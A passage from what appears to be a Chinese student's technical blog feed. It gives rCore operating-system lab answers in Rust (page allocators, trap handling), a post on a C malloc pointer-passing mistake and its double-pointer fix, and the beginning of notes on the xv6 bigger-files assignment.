<p>实现在<code>algorithm/src/allocator/stacked_allocator.rs</code>里，实现如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackedAllocator</span></span> &#123;</span><br><span class="line">    list: <span class="built_in">Vec</span>&lt;(<span class="built_in">usize</span>, <span class="built_in">usize</span>)&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> Allocator <span class="keyword">for</span> StackedAllocator &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(capacity: <span class="built_in">usize</span>) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123;</span><br><span class="line">            list: <span class="built_in">vec!</span>[(<span class="number">0</span>, capacity)],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">alloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) -&gt; <span class="built_in">Option</span>&lt;<span class="built_in">usize</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>((start, end)) = <span class="keyword">self</span>.list.pop() &#123;</span><br><span class="line">            <span class="keyword">if</span> end - start &gt; <span class="number">1</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.list.push((start + <span class="number">1</span>, end));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">Some</span>(start)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">dealloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, index: <span class="built_in">usize</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.list.push((index, index + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出空间复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，时间复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
<p>II.  二选一：实现基于线段树的物理页面分配算法（不需要考虑合并分配）；或尝试修改 <code>FrameAllocator</code>，令其使用未被分配的页面空间（而不是全局变量）来存放页面使用状态。</p>
<p>基于线段树的物理页面算法分配：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Segment Tree Allocator Implement</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> super::Allocator;</span><br><span class="line"><span class="keyword">use</span> alloc::&#123;vec, vec::<span class="built_in">Vec</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> bit_field::BitArray;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">SegmentTreeAllocator</span></span> &#123;</span><br><span class="line">    tree: <span class="built_in">Vec</span>&lt;<span class="built_in">u8</span>&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> Allocator <span class="keyword">for</span> SegmentTreeAllocator &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(capacity: <span class="built_in">usize</span>) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> leaf_count = capacity.next_power_of_two();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tree = <span class="built_in">vec!</span>[<span class="number">0u8</span>; leaf_count * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> (capacity..leaf_count)&#123;</span><br><span class="line">            tree.set_bit(index, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> (<span class="number">1</span>..leaf_count).rev() &#123;</span><br><span class="line">            <span class="keyword">let</span> value = tree.get_bit(<span class="number">2</span> * index) &amp;&amp; tree.get_bit(<span class="number">2</span> * index + <span class="number">1</span>) &amp;&amp; tree.get_bit(index);</span><br><span class="line">            tree.set_bit(index, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Self</span>&#123; tree &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">alloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) -&gt; <span class="built_in">Option</span>&lt;<span class="built_in">usize</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> index = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.tree.get_bit(index) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span> index &lt; <span class="keyword">self</span>.tree.len()/<span class="number">2</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">self</span>.tree.get_bit(index * <span class="number">2</span>))&#123;</span><br><span class="line">                    index *= <span class="number">2</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">self</span>.tree.get_bit(index * <span class="number">2</span> + <span class="number">1</span>))&#123;</span><br><span class="line">                    index = index * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">panic!</span>(<span class="string">&quot;Damaged Segement Tree!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span>.uploadNode(index, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">Some</span>(index - <span class="keyword">self</span>.tree.len()/<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">dealloc</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, index: <span class="built_in">usize</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> node = index + <span class="keyword">self</span>.tree.len()/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">self</span>.uploadNode(node, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> SegmentTreeAllocator&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">uploadNode</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, <span class="keyword">mut</span> index: <span class="built_in">usize</span>, value: <span class="built_in">bool</span>)&#123;</span><br><span class="line">        <span class="keyword">self</span>.tree.set_bit(index, value);</span><br><span class="line">        <span class="keyword">while</span> index &gt; <span class="number">1</span> &#123;</span><br><span class="line">            index /= <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">let</span> v = <span class="keyword">self</span>.tree.get_bit(<span class="number">2</span> * index) &amp;&amp; <span class="keyword">self</span>.tree.get_bit(<span class="number">2</span> * index + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">self</span>.tree.set_bit(index, v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/08/rCore-Lab-2/result1.png" alt></p>
<ol start="4">
<li>挑战实验（选做）：</li>
</ol>
<p>I. 在 <code>memory/heap2.rs</code> 中，提供了一个手动实现堆的方法。它使用 <code>algorithm::VectorAllocator</code> 作为其根本分配算法，而我们目前提供了一个非常简单的 bitmap 算法（而且只开了很小的空间）。请在 <code>algorithm</code> crate 中利用伙伴算法实现 <code>VectorAllocator</code> trait。</p>
<p>II. 前面说到，堆的实现本身不能完全使用动态内存分配。但有没有可能让堆能够利用动态分配的空间，这样做会带来什么好处？</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>rCore Lab-1</title>
    <url>/2021/02/07/rCore-Lab-1/</url>
    <content><![CDATA[<h2 id="实验一-中断"><a class="markdownIt-Anchor" href="#实验一-中断"></a> 实验一： 中断</h2>
<h3 id="实验题"><a class="markdownIt-Anchor" href="#实验题"></a> 实验题：</h3>
<p>1.原理：在rust_main函数中，执行<code>ebreak</code>命令后至函数结束前，<code>sp</code>寄存器的值是怎样变化的？</p>
<p>在rust_main函数中执行<code>ebreak</code>进入中断，首先需要在栈上开辟Context所需空间，即将栈顶（即<code>sp</code>寄存器）减去 34*8 bits。随后在<code>__restore</code>中恢复了<code>sp</code>寄存器中位置。</p>
<p>2.分析：如果去掉 <code>rust_main</code> 后的 <code>panic</code> 会发生什么，为什么？</p>
<p>去掉rust_main后的<code>panic</code>后程序将不会立刻返回。执行<code>ebreak</code>函数后进入到<code>interrupt_handler</code>函数中，判断为断点后进入<code>breakpoint</code>函数进行处理，在<code>breakpoint</code>函数中打印出断点位置并将<code>sepc</code>寄存器+2后返回，调用<code>__restore</code>函数恢复所有寄存器，并跳转至<code>Context</code>中<code>sepc</code>的位置上，即会回到<code>entry.asm</code>中，此时<code>entry.asm</code>函数后并未做任何处理。</p>
<p>3.实验：</p>
<p>I. 如果程序访问不存在的地址，会得到 <code>Exception::LoadFault</code>。模仿捕获 <code>ebreak</code> 和时钟中断的方法，捕获 <code>LoadFault</code>（之后 <code>panic</code> 即可）</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">handle_interrupt</span></span>(context: &amp;<span class="keyword">mut</span> Context, scause: Scause, stval: <span class="built_in">usize</span>) &#123;</span><br><span class="line">    <span class="comment">// panic!(&quot;Interrupted: &#123;:?&#125;&quot;, scause.cause());</span></span><br><span class="line">    <span class="keyword">match</span> scause.cause() &#123;</span><br><span class="line">        <span class="comment">// breakpoint interrupt(ebark)</span></span><br><span class="line">        Trap::Exception(Exception::Breakpoint) =&gt; breakpoint(context),</span><br><span class="line">        <span class="comment">// clock interrupt</span></span><br><span class="line">        Trap::Interrupt(Interrupt::SupervisorTimer) =&gt; supervisor_timer(context),</span><br><span class="line">        <span class="comment">// Visit a non-existent address</span></span><br><span class="line">        Trap::Exception(Exception::LoadFault) =&gt; load_falut(context)</span><br><span class="line">        <span class="comment">// Other Situations: Stop current thread</span></span><br><span class="line">        _ =&gt; fault(context, scause, stval),</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>match</code>中加入对<code>Exception::LoadFault</code>异常的处理。在<code>load_falut</code>函数中直接<code>panic!</code></p>
<p>II. 在处理异常的过程中，如果程序想要非法访问的地址是 <code>0x0</code>，则打印 <code>SUCCESS!</code></p>
<p><strong>答：</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handler Load Fault</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">load_falut</span></span>(context: &amp;<span class="keyword">mut</span> Context, scause: Scause, stval: <span class="built_in">usize</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stval == <span class="number">0x0</span>)&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">panic!</span>(</span><br><span class="line">        <span class="string">&quot;Interrupt: &#123;:?&#125;\n&#123;:x?&#125;\nstval: &#123;:x&#125;&quot;</span>,</span><br><span class="line">        scause.cause(),</span><br><span class="line">        context,</span><br><span class="line">        stval</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>III. 添加或修改少量代码，使得运行时触发这个异常，并且打印出 <code>SUCCESS!</code>。</p>
<ul>
<li>要求：不允许添加或修改任何 unsafe 代码</li>
</ul>
<p>在<code>handle_interript</code>函数下加入<code>context.sepc = 0;</code>将触发中断指令地址设置为0，即可跳转到加载地址异常。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>rCore</tag>
      </tags>
  </entry>
  <entry>
    <title>一个关于C语言内存分配的误区</title>
    <url>/2021/01/04/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8EC%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E8%AF%AF%E5%8C%BA/</url>
    <content><![CDATA[<h2 id="起源"><a class="markdownIt-Anchor" href="#起源"></a> 起源</h2>
<p>事情是这样的，我在编写一段Unicode解析的代码时，需要先判断输入的Unicode后面从’\u’后是否为4位16进制数，如果是的话，就将这几位复制到一段字符串中并进行解析，如果不是的话则抛出异常。</p>
<p>这段代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *high = <span class="literal">NULL</span>, *low = <span class="literal">NULL</span>;</span><br><span class="line">   p = charcpy(p, high);</span><br><span class="line">   <span class="keyword">if</span>(!p)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(*p == <span class="string">&#x27;\\&#x27;</span>)&#123;</span><br><span class="line">       p++;</span><br><span class="line">       p = charcpy(p, low);</span><br><span class="line">       <span class="keyword">if</span>(!p)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中，<code>charcpy</code>函数的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">charcpy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span class="keyword">char</span>* target)</span></span>&#123;</span><br><span class="line">    target = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">4</span>; len++)&#123;</span><br><span class="line">    	 <span class="keyword">int</span> flag = ((*p)&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; (*p)&lt;=<span class="string">&#x27;9&#x27;</span>) || ((*p)&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; (*p)&lt;=<span class="string">&#x27;F&#x27;</span>) || ((*p) &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; (*p) &lt;= <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!flag)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        target[len] = *p;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    target[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">4</span>; len++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,target[len]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先为target分配内存，然后循环判断p的值是否为16进制数，是的话则赋值给target，否则就直接返回空。</p>
<p>想法很美好，然而现实很崩溃。当我编译运行时则爆出segmentation fault,，这时我debug的时候，发现high仍为空，也就是说charcpy这个函数里的操作并没有改变high。</p>
<h2 id="传值与传指针"><a class="markdownIt-Anchor" href="#传值与传指针"></a> 传值与传指针</h2>
<p>C函数传递参数有两种参数，值传递与指针传递。而事实上指针传递也可以看成是值传递，只不过传的类型是指针。当我们将high指针传入函数时，此时的target指向high，但当我们为target指针分配内存的时候，此时target指针将不再指向high，而是脱离出来重新分配内存。解决方法则是使用二重指针传递，当我们使用二重指针的时候，此时target与&amp;high等价，因此我们对*target进行分配内存时，则可以对high进行修改了。</p>
<p>修改后代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">charcpy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span class="keyword">char</span>** target)</span></span>&#123;</span><br><span class="line">    *target = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">4</span>; len++)&#123;</span><br><span class="line">        <span class="keyword">int</span> flag = ((*p)&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; (*p)&lt;=<span class="string">&#x27;9&#x27;</span>) || ((*p)&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; (*p)&lt;=<span class="string">&#x27;F&#x27;</span>) || ((*p) &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; (*p) &lt;= <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!flag)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        (*target)[len] = *p;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    (*target)[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">4</span>; len++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(*target)[len]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>xv6 Bigger Files</title>
    <url>/2020/12/26/xv6-bigger-files/</url>
    <content><![CDATA[<h2 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h2>
<p>In this assignment you’ll increase the maximum size of an xv6 file. Currently xv6 files are limited to 140 sectors, or 71,680 bytes. This limit comes from the fact that an xv6 inode contains 12 “direct” block numbers and one “singly-indirect” block number, which refers to a block that holds up to 128 more block numbers, for a total of 12+128=140. You’ll change the xv6 file system code to support a “doubly-indirect” block in each inode, containing 128 addresses of singly-indirect blocks, each of which can contain up to 128 addresses of data blocks. The result will be that a file will be able to consist of up to 16523 sectors (or about 8.5 megabytes).</p>
<h3 id="preliminaries"><a class="markdownIt-Anchor" href="#preliminaries"></a> Preliminaries</h3>
<p>Modify your Makefile’s <code>CPUS</code> definition so that it reads:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CPUS :&#x3D; 1</span><br></pre></td></tr></table></figure>
<p>Add</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QEMUEXTRA &#x3D; -snapshot</span><br></pre></td></tr></table></figure>
<p>right before <code>QEMUOPTS</code></p>
<p>The above two steps speed up qemu tremendously when xv6 creates large files.</p>
<p><code>mkfs</code> initializes the file system to have fewer than 1000 free data blocks, too few to show off the changes you’ll make. Modify <code>param.h</code> to set <code>FSSIZE</code> to:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FSSIZE       20000  <span class="comment">// size of file system in blocks</span></span></span><br></pre></td></tr></table></figure>
<p>Download <a href="https://pdos.csail.mit.edu/6.828/2018/homework/big.c">big.c</a> into your xv6 directory, add it to the UPROGS list, start up xv6, and run <code>big</code>. It creates as big a file as xv6 will let it, and reports the resulting size. It should say 140 sectors.</p>
<h3 id="what-to-look-at"><a class="markdownIt-Anchor" href="#what-to-look-at"></a> What to Look At</h3>
<p>The format of an on-disk inode is defined by <code>struct dinode</code> in <code>fs.h</code>. You’re particularly interested in <code>NDIRECT</code>, <code>NINDIRECT</code>, <code>MAXFILE</code>, and the <code>addrs[]</code> element of <code>struct dinode</code>. Look <a href="https://pdos.csail.mit.edu/6.828/2018/homework/inode.pdf">here</a> for a diagram of the standard xv6 inode.</p>
<p>The code that finds a file’s data on disk is in <code>bmap()</code> in <code>fs.c</code>. Have a look at it and make sure you understand what it’s doing. <code>bmap()</code> is called both when reading and writing a file. When writing, <code>bmap()</code> allocates new blocks as needed to hold file content, as well as allocating an indirect block if needed to hold block addresses.</p>
<p><code>bmap()</code> deals with two kinds of block numbers. The <code>bn</code> argument is a “logical block” – a block number relative to the start of the file. The block numbers in <code>ip-&gt;addrs[]</code>, and the argument to <code>bread()</code>, are disk block numbers. You can view <code>bmap()</code> as mapping a file’s logical block numbers into disk block numbers.</p>
<h3 id="your-job"><a class="markdownIt-Anchor" href="#your-job"></a> Your Job</h3>
<p>Modify <code>bmap()</code> so that it implements a doubly-indirect block, in addition to direct blocks and a singly-indirect block. You’ll have to have only 11 direct blocks, rather than 12, to make room for your new doubly-indirect block; you’re not allowed to change the size of an on-disk inode. The first 11 elements of <code>ip-&gt;addrs[]</code> should be direct blocks; the 12th should be a singly-indirect block (just like the current one); the 13th should be your new doubly-indirect block.</p>
<p>You don’t have to modify xv6 to handle deletion of files with doubly-indirect blocks.</p>
<p>If all goes well, <code>big</code> will now report that it can write 16523 sectors. It will take <code>big</code> a few dozen seconds to finish.</p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<p>在解决此问题之前，我们首先看一张图来了解<code>xv6</code>操作系统关于文件系统的架构和实现：</p>
<p><img src="/2020/12/26/xv6-bigger-files/file-structer.jpg" alt></p>
<p><code>xv6</code>文件系统将文件的结构分成了7层，从最上层的文件描述符到最底层的磁盘。</p>
<p>当今的Unix文件系统(Unix File System, UFS)起源于Berkeley Fast File System。和所有的文件系统一样，Unix文件系统是以块(Block)为单位对磁盘进行读写的。一般而言，一个块的大小为512Byte或者4KB。文件系统的所有数据结构都以块为单位存储在硬盘上，一些典型的数据块包括：superblock, inode, data block, directory block and indirection block。</p>
<p>Superblock包含了关于整个文件系统的元信息(metadata)，比如文件系统的类型、大小、状态和关于其他文件系统数据结构的信息。Superblock对文件系统是非常重要的，因此Unix文件系统的实现会保存多个Superblock的副本。</p>
<p>inode是Unix文件系统中用于表示文件的抽象数据结构。inode不仅是指抽象了一组硬盘上的数据的”文件”，目录和外部IO设备等也会用inode数据结构来表示。inode包含了一个文件的元信息，比如拥有者、访问权限、文件类型等等。对于一个文件系统里的所有文件，文件系统会维护一个inode列表，这个列表可能会占据一个或者多个磁盘块。</p>
<p>Data block用于存储实际的文件数据。一些文件系统中可能会存在用于存放目录的Directory Block和Indirection Block，但是在Unix文件系统中这些文件块都被视为数据，上层文件系统通过inode对其加以操作，他们唯一的区别是inode里记录的属性有所不同。</p>
<p>Xv6中的文件系统设计思想与Unix大抵相同，但是实现细节多有简化。在底层实现上，Xv6采用与Linux类似的分层实现思路，层层向上逐级封装，以便能支持多种多样的设备和IO方式。Xv6的文件系统包含了磁盘IO层、Log层、Inode层、File层和系统调用层，下面会依次介绍其实现：</p>
<h3 id="xv6磁盘io"><a class="markdownIt-Anchor" href="#xv6磁盘io"></a> xv6磁盘IO</h3>
<p>Xv6中的磁盘IO在<code>ide.c</code>中，这是一个基于Programmed IO的面向IDE磁盘的简单实现。一个Xv6中的磁盘读写请求用如下的数据结构表示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buf</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  uint dev;</span><br><span class="line">  uint blockno;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span></span><br><span class="line">  uint refcnt;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">prev</span>;</span> <span class="comment">// LRU cache list</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">qnext</span>;</span> <span class="comment">// disk queue</span></span><br><span class="line">  uchar data[BSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，对IDE磁盘而言，需要关心的域是<code>flags</code>(DIRTY, VALID)，<code>dev</code>(设备)，<code>blockno</code>(磁盘块编号)和<code>next</code>(指向队列的下一个成员的指针).</p>
<p>磁盘读写实现的思路是这样的：Xv6会维护一个进程请求磁盘操作的队列(<code>idequeue</code>)。当进程请求磁盘读写时，请求会被加入队列，进程会进入睡眠状态(<code>iderw()</code>)。任何时候，队列的开头表示当前正在进行的磁盘读写请求。当一个磁盘读写操作完成时，会触发一个中断，中断处理程序(<code>ideintr()</code>)会移除队列开头的请求，唤醒队列开头请求所对应的进程。如果还有后续的请求，就会将其移到队列开头，开始处理下一个磁盘请求。</p>
<p>磁盘请求队列的声明如下，当然对其访问是必须加锁的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">idelock</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">idequeue</span>;</span></span><br></pre></td></tr></table></figure>
<p><code>ide.c</code>中函数及其对应功能如下</p>
<table>
<thead>
<tr>
<th style="text-align:left">函数名</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>idewait()</code></td>
<td style="text-align:left">等待磁盘进入空闲状态</td>
</tr>
<tr>
<td style="text-align:left"><code>ideinit()</code></td>
<td style="text-align:left">初始化IDE磁盘IO</td>
</tr>
<tr>
<td style="text-align:left"><code>idestart()</code></td>
<td style="text-align:left">开始一个磁盘读写请求</td>
</tr>
<tr>
<td style="text-align:left"><code>iderw()</code></td>
<td style="text-align:left">上层文件系统调用的磁盘IO接口</td>
</tr>
<tr>
<td style="text-align:left"><code>ideintr()</code></td>
<td style="text-align:left">当磁盘请求完成后中断处理程序会调用的函数</td>
</tr>
</tbody>
</table>
<p>操作系统启动时，<code>main()</code>函数会调用<code>ideinit()</code>对<code>ide</code>磁盘进行初始化，初始化函数中会初始化ide锁，设定磁盘中断控制，并检查是否存在第二个磁盘。</p>
<p><code>iderw()</code>函数提供了面向顶层文件系统模块的接口。<code>iderw()</code>既可用于读，也可用于写，只需通过判断<code>buf-&gt;flag</code>里的DIRTY位和VALID位就能判断出请求是读还是写。如果请求队列为空，证明当前磁盘不是工作状态，那么就需要调用<code>idestart()</code>函数初始化磁盘请求队列，并设置中断。如果请求是个写请求，那么<code>idestart()</code>中会向磁盘发出写出数据的指令。之后，<code>iderw()</code>会将调用者陷入睡眠状态。</p>
<p>当磁盘读取或者写操作完毕时，会触发中断进入<code>trap.c</code>中的<code>trap()</code>函数，<code>trap()</code>函数会调用<code>ideintr()</code>函数处理磁盘相关的中断。在<code>ideintr()</code>函数中，如果当前请求是读请求，就读取目前已经在磁盘缓冲区中准备好的数据。最后，<code>ideintr()</code>会唤醒正在睡眠等待当前请求的进程，如果队列里还有请求，就调用<code>idestart()</code>来处理新的请求。</p>
<p>##Buffer Cache的功能与实现</p>
<p>在文件系统中，Buffer Cache担任了一个磁盘与内存文件系统交互的中间层。由于对磁盘的读取是非常缓慢的，因此将最近经常访问的磁盘块缓存在内存里是很有益处的。</p>
<p>Xv6中Buffer Cache的实现在bio.c中，Buffer Cache的数据结构如下(rev11版本)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">  struct spinlock lock;</span><br><span class="line">  struct buf buf[NBUF];</span><br><span class="line">  &#x2F;&#x2F; Linked list of all buffers, through prev&#x2F;next.</span><br><span class="line">  &#x2F;&#x2F; head.next is most recently used.</span><br><span class="line">  struct buf head;</span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure>
